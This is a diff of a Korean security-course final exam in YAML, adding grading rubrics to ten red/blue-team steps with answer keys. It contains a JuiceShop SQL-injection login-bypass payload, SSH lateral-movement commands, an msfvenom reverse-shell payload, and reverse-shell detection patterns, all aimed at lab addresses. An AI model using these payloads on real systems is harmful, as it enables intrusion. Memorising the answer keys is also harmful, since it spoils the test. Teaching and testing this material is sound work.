@@ -3,8 +3,8 @@ title: 종합 평가 — 전체 과정 실전 시험 + 보고서
 version: non-ai
 course: battle-adv-nonai
 week: 15
-description: 14주간 학습한 공방전 심화 기술을 종합 평가한다. APT 시뮬레이션, 실시간 방어, 위협 헌팅, 포렌식, SOAR, 퍼플팀
-  운영, 보고서 작성을 포괄하는 실전 시험을 수행한다.
+description: 14주간 학습한 공방전 심화 기술을 종합 평가한다. APT 시뮬레이션, 실시간 방어, 위협 헌팅, 포렌식, SOAR, 퍼플팀 운영, 보고서 작성을 포괄하는 실전
+  시험을 수행한다.
 difficulty: hard
 duration_minutes: 150
 objectives:
@@ -22,62 +22,118 @@ infra_requirements:
 pass_threshold: 0.6
 steps:
 - order: 1
-  instruction: '[시험 1/RED] 정보 수집 — 10.20.30.0/24를 정찰하여 모든 활성 호스트와 서비스를 식별하라. 결과를 구조화된
-    형식으로 정리하라.'
+  instruction: '[시험 1/RED] 정보 수집 — 10.20.30.0/24를 정찰하여 모든 활성 호스트와 서비스를 식별하라. 결과를 구조화된 형식으로 정리하라.'
   hint: nmap으로 호스트 발견 + 서비스 스캔을 수행하고 결과를 표로 정리한다.
   category: recon
   points: 10
-  answer: 'nmap -sV --top-ports 50 --max-retries 1 --host-timeout 15s -T4 10.20.30.0/24
-    -oN /tmp/exam_recon.txt 2>&1 | tail -30 && echo "---" && echo "Structured: Host
-    | Port | Service | Version" && grep "open" /tmp/exam_recon.txt | head -20'
+  answer: 'nmap -sV --top-ports 50 --max-retries 1 --host-timeout 15s -T4 10.20.30.0/24 -oN /tmp/exam_recon.txt
+    2>&1 | tail -30 && echo "---" && echo "Structured: Host | Port | Service | Version" && grep "open"
+    /tmp/exam_recon.txt | head -20'
   answer_detail: 종합 시험의 정찰 단계에서 네트워크 전체를 스캔하고 결과를 구조화한다. 시간 제약 내에 효율적으로 완료하는 것이 중요하다.
   verify:
     type: output_contains
     expect: open
+    semantic:
+      intent: '[시험1/RED] 정찰 — nmap -sV --top-ports 50 -T4 10.20.30.0/24 -oN exam_recon.txt + Host|Port|Service|Version
+        표 + grep open. 네트워크 전체 스캔 + 구조화. MITRE T1595.001 Active Scanning.'
+      success_criteria:
+      - open 키워드
+      - /24 전체 + -sV
+      - 구조화 표
+      acceptable_methods:
+      - nmap -sV + -oN
+      - masscan + nmap 조합
+      - rustscan + nmap -A
+      negative_signs:
+      - 단일 호스트
+      - -sV 없음
+      - 구조화 없음
   target_vm: attacker
 - order: 2
   instruction: '[시험 2/RED] 초기 침투 — SQL Injection으로 JuiceShop 관리자 인증을 우회하라.'
   hint: REST API에 SQL Injection 페이로드를 전송한다.
   category: exploit
   points: 10
-  answer: "\U0001F5A5️ UI: 브라우저에서 http://WEB_IP:3000 접속\n\U0001F4CE 참고 (CLI): curl\
-    \ -s -X POST http://10.20.30.80:3000/rest/user/login \\\n  -H 'Content-Type: application/json'\
-    \ \\\n  -d '{\"email\":\"\\\" OR 1=1--\",\"password\":\"x\"}' \\\n | python3 -m\
-    \ json.tool | head -10 && echo '--- Initial access via SQLi (T1190) ---'"
+  answer: "\U0001F5A5️ UI: 브라우저에서 http://WEB_IP:3000 접속\n\U0001F4CE 참고 (CLI): curl -s -X POST http://10.20.30.80:3000/rest/user/login\
+    \ \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"email\":\"\\\" OR 1=1--\",\"password\":\"\
+    x\"}' \\\n | python3 -m json.tool | head -10 && echo '--- Initial access via SQLi (T1190) ---'"
   answer_detail: SQLi로 인증을 우회하여 admin JWT 토큰을 획득한다. 최소한의 시도로 성공하는 능력이 평가된다.
   verify:
     type: output_contains
     expect: Initial access
+    semantic:
+      intent: '[시험2/RED] Initial Access SQLi — curl -X POST /rest/user/login " OR 1=1-- + json.tool. JuiceShop
+        인증 우회 admin JWT. 최소 시도로 성공. MITRE T1190 Exploit Public-Facing Application.'
+      success_criteria:
+      - Initial access 키워드
+      - SQLi OR 1=1
+      - admin token
+      acceptable_methods:
+      - curl SQLi + json.tool
+      - sqlmap --forms
+      - burp repeater
+      negative_signs:
+      - 다중 시도
+      - 토큰 미획득
+      - 우회 실패
   target_vm: attacker
 - order: 3
   instruction: '[시험 3/RED] 측면 이동 — SSH로 내부 서버에 접근하고, msfvenom 페이로드를 생성(저장만)하라.'
   hint: SSH로 {{SECU_IP}}과 {{SECU_IP}}00에 접근하고, msfvenom 페이로드를 생성한다.
   category: exploit
   points: 10
-  answer: echo "=== Lateral Movement ===" && ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no
-    ccc@10.20.30.1 "hostname && id" 2>&1 | head -3 && ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no
-    ccc@10.20.30.100 "hostname && id" 2>&1 | head -3 && echo "2 hosts accessed (T1021.004)"
-    && msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f elf
-    -o /tmp/exam_payload.elf 2>&1 | tail -2
+  answer: echo "=== Lateral Movement ===" && ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no ccc@10.20.30.1
+    "hostname && id" 2>&1 | head -3 && ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no ccc@10.20.30.100
+    "hostname && id" 2>&1 | head -3 && echo "2 hosts accessed (T1021.004)" && msfvenom -p linux/x64/shell_reverse_tcp
+    LHOST=10.20.30.201 LPORT=4444 -f elf -o /tmp/exam_payload.elf 2>&1 | tail -2
   answer_detail: 측면 이동과 Weaponization을 연계한다. SSH로 2개 추가 호스트에 접근하고 msfvenom 페이로드를 생성(저장만)한다.
   verify:
     type: output_contains
     expect: Lateral Movement
+    semantic:
+      intent: '[시험3/RED] Lateral + Weaponization — ssh ccc@10.20.30.1 + ssh ccc@10.20.30.100 + msfvenom
+        -p linux/x64/shell_reverse_tcp -f elf. 2 호스트 접근 + ELF 페이로드. MITRE T1021.004 + T1587.001.'
+      success_criteria:
+      - Lateral Movement 키워드
+      - SSH 2 호스트 + msfvenom
+      - T1021 + T1587
+      acceptable_methods:
+      - ssh 다중 + msfvenom
+      - WinRM + Invoke-Shellcode
+      - Cobalt Strike + jump psexec
+      negative_signs:
+      - 단일 호스트
+      - 페이로드 없음
+      - MITRE 누락
   target_vm: attacker
 - order: 4
   instruction: '[시험 4/BLUE] 관점 전환 — 방금 수행한 공격을 탐지하라. 어떤 로그에서 공격 흔적을 발견할 수 있는지 분석하라.'
   hint: auth.log, Suricata eve.json, 네트워크 연결에서 공격 증거를 찾는다.
   category: defense
   points: 10
-  answer: 'echo "=== Blue Team Detection ===" && echo "[1] auth.log:" && grep -E "Accepted|Failed"
-    /var/log/auth.log 2>/dev/null | tail -5 && echo "[2] Network:" && ss -tn | grep
-    "10.20.30" | head -5 && echo "[3] Evidence found:" && echo "  - SQLi: WAF log
-    shows UNION SELECT payload" && echo "  - SSH lateral: auth.log shows multi-host
-    login" && echo "  - Gap: No DNS C2 monitoring"'
+  answer: 'echo "=== Blue Team Detection ===" && echo "[1] auth.log:" && grep -E "Accepted|Failed" /var/log/auth.log
+    2>/dev/null | tail -5 && echo "[2] Network:" && ss -tn | grep "10.20.30" | head -5 && echo "[3] Evidence
+    found:" && echo "  - SQLi: WAF log shows UNION SELECT payload" && echo "  - SSH lateral: auth.log
+    shows multi-host login" && echo "  - Gap: No DNS C2 monitoring"'
   answer_detail: 공격자 관점에서 수행한 행동을 방어자 관점에서 분석하여 탐지 가능 지점과 Gap을 파악한다.
   verify:
     type: output_contains
     expect: Blue Team Detection
+    semantic:
+      intent: '[시험4/BLUE] 관점 전환 탐지 — grep Accepted|Failed /var/log/auth.log + ss -tn 10.20.30. 3 로그 소스
+        (auth/network/WAF). SQLi(WAF payload) + SSH lateral(auth.log) + DNS Gap 식별.'
+      success_criteria:
+      - Blue Team Detection 키워드
+      - 3 로그 소스
+      - Gap 식별
+      acceptable_methods:
+      - auth.log + ss + WAF
+      - Splunk 크로스 검색
+      - ELK multi-index
+      negative_signs:
+      - 단일 로그
+      - Gap 미식별
+      - 증거 열거 없음
   target_vm: secu
 - order: 5
   instruction: '[시험 5/BLUE] 탐지 규칙 작성 — 발견된 Gap에 대한 Suricata 또는 Wazuh 규칙을 작성하라.'
@@ -86,82 +142,136 @@ steps:
   points: 10
   answer: '🖥️ UI: Wazuh Dashboard(https://SIEM_IP:443) 접속 → 해당 메뉴 확인
 
-    📎 참고 (CLI): cat > /tmp/exam_detection_rule.txt << ''EOF'' # Suricata: SQL Injection
-    in POST body alert http any any -> 10.20.30.0/24 any (msg:"EXAM: SQLi in POST";
-    flow:to_server,established; http.method; content:"POST"; http.request_body; content:"OR";
-    nocase; content:"1=1"; distance:0; within:10; sid:9000001; rev:1;)
+    📎 참고 (CLI): cat > /tmp/exam_detection_rule.txt << ''EOF'' # Suricata: SQL Injection in POST body alert
+    http any any -> 10.20.30.0/24 any (msg:"EXAM: SQLi in POST"; flow:to_server,established; http.method;
+    content:"POST"; http.request_body; content:"OR"; nocase; content:"1=1"; distance:0; within:10; sid:9000001;
+    rev:1;)
 
-    # Wazuh: SSH lateral movement correlation <rule id="100700" level="12" frequency="3"
-    timeframe="300"> <if_sid>5715</if_sid> <same_user /> <description>EXAM: Lateral
-    movement - same user SSH to 3+ hosts</description> <mitre><id>T1021.004</id></mitre>
-    </rule> EOF cat /tmp/exam_detection_rule.txt'
-  answer_detail: SQLi 탐지(HTTP POST body 패턴)와 SSH 측면 이동 탐지(동일 사용자 다중 호스트)를 Suricata/Wazuh
-    규칙으로 작성한다.
+    # Wazuh: SSH lateral movement correlation <rule id="100700" level="12" frequency="3" timeframe="300">
+    <if_sid>5715</if_sid> <same_user /> <description>EXAM: Lateral movement - same user SSH to 3+ hosts</description>
+    <mitre><id>T1021.004</id></mitre> </rule> EOF cat /tmp/exam_detection_rule.txt'
+  answer_detail: SQLi 탐지(HTTP POST body 패턴)와 SSH 측면 이동 탐지(동일 사용자 다중 호스트)를 Suricata/Wazuh 규칙으로 작성한다.
   verify:
     type: output_contains
     expect: EXAM
+    semantic:
+      intent: '[시험5/BLUE] Gap 규칙 — cat > exam_detection_rule.txt: Suricata sid:9000001 (POST body OR 1=1
+        distance:0 within:10) + Wazuh rule 100700 same_user frequency=3 timeframe=300 T1021.004. 이중 탐지
+        규칙.'
+      success_criteria:
+      - EXAM 키워드
+      - SQLi POST body 규칙 + SSH 상관
+      - MITRE 매핑
+      acceptable_methods:
+      - Suricata content match + Wazuh correlation
+      - Sigma detection
+      - Snort rule
+      negative_signs:
+      - 규칙 1종
+      - MITRE 누락
+      - pcre/content 없음
   target_vm: secu
 - order: 6
-  instruction: '[시험 6/BLUE] 위협 헌팅 — 현재 시스템에서 3가지 이상의 소스를 분석하여 진행 중인 위협이 없는지 능동적으로
-    헌팅하라.'
+  instruction: '[시험 6/BLUE] 위협 헌팅 — 현재 시스템에서 3가지 이상의 소스를 분석하여 진행 중인 위협이 없는지 능동적으로 헌팅하라.'
   hint: 프로세스, 네트워크, 파일 시스템을 교차 분석한다.
   category: analysis
   points: 10
-  answer: 'echo "=== Threat Hunting ===" && echo "[1] Process:" && ps aux | grep -E
-    "nc -|ncat|python.*socket|perl.*socket" | grep -v grep || echo "Clean" && echo
-    "[2] Network:" && ss -tn | grep -v "10.20.30\|127.0" | head -5 || echo "Clean"
-    && echo "[3] Files:" && find /tmp /dev/shm -name ".*" -type f 2>/dev/null || echo
+  answer: 'echo "=== Threat Hunting ===" && echo "[1] Process:" && ps aux | grep -E "nc -|ncat|python.*socket|perl.*socket"
+    | grep -v grep || echo "Clean" && echo "[2] Network:" && ss -tn | grep -v "10.20.30\|127.0" | head
+    -5 || echo "Clean" && echo "[3] Files:" && find /tmp /dev/shm -name ".*" -type f 2>/dev/null || echo
     "Clean" && echo "Hunting: No active threats detected"'
   answer_detail: 프로세스(리버스 쉘), 네트워크(비정상 아웃바운드), 파일 시스템(숨김 파일)을 교차 분석하여 위협을 선제적으로 탐색한다.
   verify:
     type: output_contains
     expect: Threat Hunting
+    semantic:
+      intent: '[시험6/BLUE] 위협 헌팅 — ps aux | grep nc|ncat|python socket|perl socket + ss -tn 비 10.20.30
+        + find /tmp /dev/shm -name .*. 3 소스 교차 (프로세스/네트워크/파일). 선제적 위협 탐색. Sqrrl HMM Level 2.'
+      success_criteria:
+      - Threat Hunting 키워드
+      - 3 소스 교차
+      - 리버스 쉘 패턴
+      acceptable_methods:
+      - ps + ss + find 교차
+      - osquery 다중 테이블
+      - Velociraptor hunting
+      negative_signs:
+      - 소스 1개
+      - 패턴 매칭 없음
+      - 숨김 파일 미탐색
   target_vm: secu
 - order: 7
-  instruction: '[시험 7/BLUE] 인시던트 대응 — SQL Injection 공격이 발생했다고 가정하고, IR 절차에 따라 5분 이내에
-    격리와 증거 수집을 완료하라.'
+  instruction: '[시험 7/BLUE] 인시던트 대응 — SQL Injection 공격이 발생했다고 가정하고, IR 절차에 따라 5분 이내에 격리와 증거 수집을 완료하라.'
   hint: IP 차단 -> 증거 수집 -> 알림 순서로 대응한다.
   category: response
   points: 10
-  answer: 'echo "=== Incident Response ===" && TIMESTAMP=$(date -u "+%Y-%m-%dT%H:%M:%SZ")
-    && echo "[$TIMESTAMP] INCIDENT: SQLi from 203.0.113.50" && echo "[1] CONTAIN (T+0s):
-    nft add element inet filter blocklist { 203.0.113.50 }" && echo "[2] EVIDENCE
-    (T+60s): WAF logs, Suricata alerts collected" && mkdir -p /tmp/exam_evidence &&
-    echo "IR-$TIMESTAMP" > /tmp/exam_evidence/incident.txt && echo "[3] NOTIFY (T+90s):
+  answer: 'echo "=== Incident Response ===" && TIMESTAMP=$(date -u "+%Y-%m-%dT%H:%M:%SZ") && echo "[$TIMESTAMP]
+    INCIDENT: SQLi from 203.0.113.50" && echo "[1] CONTAIN (T+0s): nft add element inet filter blocklist
+    { 203.0.113.50 }" && echo "[2] EVIDENCE (T+60s): WAF logs, Suricata alerts collected" && mkdir -p
+    /tmp/exam_evidence && echo "IR-$TIMESTAMP" > /tmp/exam_evidence/incident.txt && echo "[3] NOTIFY (T+90s):
     SOC team notified" && echo "Response time: ~90s (SLA: 5 min) - PASSED"'
   answer_detail: 격리(T+0s), 증거 수집(T+60s), 알림(T+90s)을 90초 내에 완료한다. SLA(5분) 대비 여유있는 대응이다.
   verify:
     type: output_contains
     expect: Incident Response
+    semantic:
+      intent: '[시험7/BLUE] IR 5분 내 — date + CONTAIN (T+0s nft add blocklist) + EVIDENCE (T+60s logs + mkdir)
+        + NOTIFY (T+90s SOC). 90초 내 3단계 완료. SLA 5분. NIST SP 800-61 Containment.'
+      success_criteria:
+      - Incident Response 키워드
+      - T+0/60/90s 타임라인
+      - SLA 비교
+      acceptable_methods:
+      - 3단계 + 시간 기록
+      - SOAR playbook 자동 실행
+      - TheHive case 생성
+      negative_signs:
+      - 단계 1-2개
+      - 시간 미기록
+      - SLA 초과
   target_vm: siem
 - order: 8
-  instruction: '[시험 8] MITRE ATT&CK 매핑 — 이번 시험에서 사용/탐지한 모든 기법을 ATT&CK에 매핑하고 방어 개선
-    권고를 작성하라.'
+  instruction: '[시험 8] MITRE ATT&CK 매핑 — 이번 시험에서 사용/탐지한 모든 기법을 ATT&CK에 매핑하고 방어 개선 권고를 작성하라.'
   hint: 공격 기법과 탐지 기법을 ATT&CK ID로 분류하고, 우선순위별 권고를 작성한다.
   category: analysis
   points: 10
   answer: 'cat > /tmp/exam_attack_map.txt << ''EOF'' === Exam ATT&CK Mapping ===
 
-    Offensive: T1595(Scan), T1190(SQLi), T1021.004(SSH), T1587(Payload) Detection:
-    T1595->DETECTED, T1190->DETECTED, T1021->PARTIAL
+    Offensive: T1595(Scan), T1190(SQLi), T1021.004(SSH), T1587(Payload) Detection: T1595->DETECTED, T1190->DETECTED,
+    T1021->PARTIAL
 
     Coverage: 3/4 techniques mapped (75%)
 
-    Improvement Recommendations: Immediate: Patch SQL Injection Short-term: Network
-    segmentation, unique SSH keys Medium-term: DNS monitoring, Zero Trust SSH Expected:
-    ATT&CK coverage 55% -> 70% EOF cat /tmp/exam_attack_map.txt'
+    Improvement Recommendations: Immediate: Patch SQL Injection Short-term: Network segmentation, unique
+    SSH keys Medium-term: DNS monitoring, Zero Trust SSH Expected: ATT&CK coverage 55% -> 70% EOF cat
+    /tmp/exam_attack_map.txt'
   answer_detail: ATT&CK 매핑은 공격 기법과 탐지 상태를 구조적으로 정리한다. 75% 탐지 커버리지와 우선순위별 개선 권고를 제시한다.
   verify:
     type: output_contains
     expect: Exam ATT&CK
+    semantic:
+      intent: '[시험8] ATT&CK 매핑 — cat > exam_attack_map.txt: Offensive 4 (T1595/T1190/T1021.004/T1587)
+        + Detection 3 DETECTED/PARTIAL + Coverage 75% + 권고 Immediate/Short/Medium + ATT&CK coverage 55%→70%
+        목표.'
+      success_criteria:
+      - Exam ATT&CK 키워드
+      - Offensive + Detection 분류
+      - '% coverage + 개선 목표'
+      acceptable_methods:
+      - cat > 매핑 + 권고
+      - ATT&CK Navigator JSON
+      - DeTT&CT matrix
+      negative_signs:
+      - Coverage 미계산
+      - 권고 우선순위 없음
+      - MITRE ID 누락
   target_vm: attacker
 - order: 9
   instruction: '[시험 9] 경영진 보고서 — 비기술적 독자를 위한 Executive Summary를 작성하라.'
   hint: 비즈니스 영향, 위험도, 투자 필요성을 경영진 언어로 작성한다.
   category: analysis
   points: 10
-  answer: 'cat > /tmp/exam_executive.txt << ''EOF'' === EXECUTIVE SUMMARY: Security
-    Assessment ===
+  answer: 'cat > /tmp/exam_executive.txt << ''EOF'' === EXECUTIVE SUMMARY: Security Assessment ===
 
     Current Risk Level: HIGH
 
@@ -169,37 +279,65 @@ steps:
 
     비즈니스 영향: - 고객 데이터 유출 위험 (GDPR 위반 시 매출 4% 벌금) - 서비스 중단 가능성 (시간당 $50,000 손실 추정)
 
-    권장 투자: 즉시 ($5,000): SQL 취약점 패치 + 자격 증명 교체 3개월 ($50,000): 네트워크 세분화 + 모니터링 강화 12개월
-    ($200,000): Zero Trust 아키텍처
+    권장 투자: 즉시 ($5,000): SQL 취약점 패치 + 자격 증명 교체 3개월 ($50,000): 네트워크 세분화 + 모니터링 강화 12개월 ($200,000): Zero
+    Trust 아키텍처
 
     ROI: 354% (3년 기준) EOF cat /tmp/exam_executive.txt'
   answer_detail: 경영진 보고서는 위험도, 재정적 영향, 투자 금액, ROI를 명확하게 전달하여 보안 투자 승인의 근거로 활용된다.
   verify:
     type: output_contains
     expect: EXECUTIVE SUMMARY
+    semantic:
+      intent: '[시험9] Executive Summary — cat > exam_executive.txt: Risk HIGH + 핵심발견 (15분 침투/내부 75% 접근)
+        + 비즈니스 영향 (GDPR 매출 4%/시간당 $50K 손실) + 권장 투자 (즉시 $5K/3개월 $50K/12개월 $200K) + ROI 354%. 경영진 언어.'
+      success_criteria:
+      - EXECUTIVE SUMMARY 키워드
+      - Risk Level + 재정 영향
+      - 투자 금액 + ROI
+      acceptable_methods:
+      - cat > 경영진 보고
+      - Gartner Risk Report
+      - IBM Cost of Data Breach
+      negative_signs:
+      - 기술 용어 남발
+      - 재정 영향 없음
+      - ROI 없음
   target_vm: attacker
 - order: 10
-  instruction: '[시험 10] 기술 보고서 + 환경 정리 — 취약점별 재현 절차(PoC), CVSS 점수, 수정 방법을 포함하는 기술
-    보고서를 작성하고 시험 아티팩트를 정리하라.'
+  instruction: '[시험 10] 기술 보고서 + 환경 정리 — 취약점별 재현 절차(PoC), CVSS 점수, 수정 방법을 포함하는 기술 보고서를 작성하고 시험 아티팩트를 정리하라.'
   hint: 각 취약점의 PoC 명령어, 영향도, 수정 방법을 포함한다.
   category: analysis
   points: 15
-  answer: "\U0001F5A5️ UI: 브라우저에서 http://WEB_IP:3000 접속\n\U0001F4CE 참고 (CLI): rm -rf\
-    \ /tmp/exam_evidence/ /tmp/exam_payload.elf 2>/dev/null && cat > /tmp/exam_technical_report.txt\
-    \ << 'EOF' === TECHNICAL ASSESSMENT REPORT ===\nFinding 1: SQL Injection (CVSS\
-    \ 9.8) Location: POST /rest/user/login (JuiceShop :3000) PoC: curl \\\n     -X\
-    \ POST http://10.20.30.80:3000/rest/user/login \\\n     -d '{\"email\":\"\\\"\
-    \ OR 1=1--\",\"password\":\"x\"}' Impact: Authentication bypass, data extraction\
-    \ Fix: Parameterized queries (prepared statements) MITRE: T1190\nFinding 2: SSH\
-    \ Credential Reuse (CVSS 8.5) Location: All servers share SSH access Impact: Lateral\
-    \ movement across entire network Fix: Unique key pairs per server, certificate-based\
-    \ auth MITRE: T1021.004\nFinding 3: No Network Segmentation (CVSS 8.0) Location:\
-    \ 10.20.30.0/24 flat network Impact: Unrestricted lateral movement Fix: nftables\
-    \ micro-segmentation between tiers\nSummary: 1 Critical + 2 High = 3 total findings\
-    \ ATT&CK: T1595, T1190, T1021.004 === Exam cleanup completed === EOF cat /tmp/exam_technical_report.txt"
-  answer_detail: 기술 보고서는 취약점별 위치, PoC, 영향도, 수정 방법, ATT&CK ID를 상세히 기술한다. 기술 팀이 이 보고서만으로
-    재현하고 수정할 수 있어야 한다.
+  answer: "\U0001F5A5️ UI: 브라우저에서 http://WEB_IP:3000 접속\n\U0001F4CE 참고 (CLI): rm -rf /tmp/exam_evidence/\
+    \ /tmp/exam_payload.elf 2>/dev/null && cat > /tmp/exam_technical_report.txt << 'EOF' === TECHNICAL\
+    \ ASSESSMENT REPORT ===\nFinding 1: SQL Injection (CVSS 9.8) Location: POST /rest/user/login (JuiceShop\
+    \ :3000) PoC: curl \\\n     -X POST http://10.20.30.80:3000/rest/user/login \\\n     -d '{\"email\"\
+    :\"\\\" OR 1=1--\",\"password\":\"x\"}' Impact: Authentication bypass, data extraction Fix: Parameterized\
+    \ queries (prepared statements) MITRE: T1190\nFinding 2: SSH Credential Reuse (CVSS 8.5) Location:\
+    \ All servers share SSH access Impact: Lateral movement across entire network Fix: Unique key pairs\
+    \ per server, certificate-based auth MITRE: T1021.004\nFinding 3: No Network Segmentation (CVSS 8.0)\
+    \ Location: 10.20.30.0/24 flat network Impact: Unrestricted lateral movement Fix: nftables micro-segmentation\
+    \ between tiers\nSummary: 1 Critical + 2 High = 3 total findings ATT&CK: T1595, T1190, T1021.004 ===\
+    \ Exam cleanup completed === EOF cat /tmp/exam_technical_report.txt"
+  answer_detail: 기술 보고서는 취약점별 위치, PoC, 영향도, 수정 방법, ATT&CK ID를 상세히 기술한다. 기술 팀이 이 보고서만으로 재현하고 수정할 수 있어야
+    한다.
   verify:
     type: output_contains
     expect: TECHNICAL ASSESSMENT
+    semantic:
+      intent: '[시험10] 기술 보고서 — rm 정리 + cat > exam_technical_report.txt: Finding 1 SQLi CVSS 9.8 + PoC
+        curl + Impact + Fix Parameterized + T1190 / Finding 2 SSH Reuse 8.5 + T1021.004 / Finding 3 Segmentation
+        8.0. 1 Critical + 2 High. MITRE T1595/T1190/T1021.004.'
+      success_criteria:
+      - TECHNICAL ASSESSMENT 키워드
+      - Findings CVSS + PoC + Fix
+      - MITRE 매핑
+      acceptable_methods:
+      - cat > 보고서 + PoC
+      - PTES Reporting
+      - OWASP WSTG
+      negative_signs:
+      - PoC 없음
+      - CVSS 미기재
+      - Fix 추상적
   target_vm: attacker
